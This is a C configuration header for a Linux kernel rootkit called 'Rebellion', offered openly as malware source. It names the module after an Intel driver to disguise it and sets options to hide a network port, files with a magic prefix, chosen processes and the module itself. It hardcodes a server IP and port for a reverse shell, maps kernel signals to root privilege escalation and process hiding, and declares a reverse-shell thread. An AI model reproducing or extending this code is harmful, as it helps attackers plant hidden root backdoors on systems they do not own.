/*
 ██▀███  ▓█████  ▄▄▄▄    ▄▄▄▄   ▓█████  ██▓     ██▓ ▒█████   ███▄    █ 
▓██ ▒ ██▒▓█   ▀ ▓█████▄ ▓█████▄ ▓█   ▀ ▓██▒    ▓██▒▒██▒  ██▒ ██ ▀█   █ 
▓██ ░▄█ ▒▒███   ▒██▒ ▄██▒██▒ ▄██▒███   ▒██░    ▒██▒▒██░  ██▒▓██  ▀█ ██▒
▒██▀▀█▄  ▒▓█  ▄ ▒██░█▀  ▒██░█▀  ▒▓█  ▄ ▒██░    ░██░▒██   ██░▓██▒  ▐▌██▒
░██▓ ▒██▒░▒████▒░▓█  ▀█▓░▓█  ▀█▓░▒████▒░██████▒░██░░ ████▓▒░▒██░   ▓██░
░ ▒▓ ░▒▓░░░ ▒░ ░░▒▓███▀▒░▒▓███▀▒░░ ▒░ ░░ ▒░▓  ░░▓  ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
  ░▒ ░ ▒░ ░ ░  ░▒░▒   ░ ▒░▒   ░  ░ ░  ░░ ░ ▒  ░ ▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
  ░░   ░    ░    ░    ░  ░    ░    ░     ░ ░    ▒ ░░ ░ ░ ▒     ░   ░ ░ 
   ░        ░  ░ ░       ░         ░  ░    ░  ░ ░      ░ ░           ░ 
                      ░       ░                                                                                                                                                      
*/
#ifndef CONFIG_H
#define CONFIG_H
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <net/sock.h>
#include <linux/ip.h>
#include <linux/inet.h>
#include <linux/skbuff.h>

#include "hooks.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("br0sck");
MODULE_DESCRIPTION("Ring 0  for Linux Kernels x86/x86_64 5.x/6.x");

//=====================[YOU CAN CHANGE THIS]========================//
#define MODULENAME "intel_rapl_headers"      // if you change the file name, you must change it here too
#define HIDE_PORT 1234              // 
#define MAGIC_PREFIX "intelheaders_"         // folder/file prefix to hide
#define HIDE_PID_LIST_SIZE 10       // maximum number of PIDs to hide
//==========[PROCESS HIDING]=========//
static pid_t hidden_pids[HIDE_PID_LIST_SIZE];
static int hidden_pid_count = 0;
//==========[AGENT EXECUTION]=========//
#define YOUR_SRV_IP "77.110.126.70"     // (kept for compatibility, not used in agent mode)
#define YOUR_SRV_PORT 1234          // (kept for compatibility, not used in agent mode)
//====================================//
#define SIGUSR1 10                  // Root privilege escalation
#define SIGUSR2 12                  // Module hide/show toggle
#define SIGRTMIN 34                 // Hide process (kill -34 0 PID_TO_HIDE)
#define SIGRTMIN1 35                // Unhide process (kill -35 0 PID_TO_UNHIDE)
//==================================================================//

#define TRUE 1
#define FALSE 0

bool isModuleHidden = FALSE;
static struct list_head *modPrevious;
static struct list_head *modKOBJPrevious;

void hideModule(void);
void showModule(void);

// Process hiding functions
int add_hidden_pid(pid_t pid);
int remove_hidden_pid(pid_t pid);
bool is_pid_hidden(pid_t pid);

static struct task_struct *revshell_thread;
// static bool execute_shell = false; // Removed - no longer needed for automatic execution

#endif // !CONFIG_H
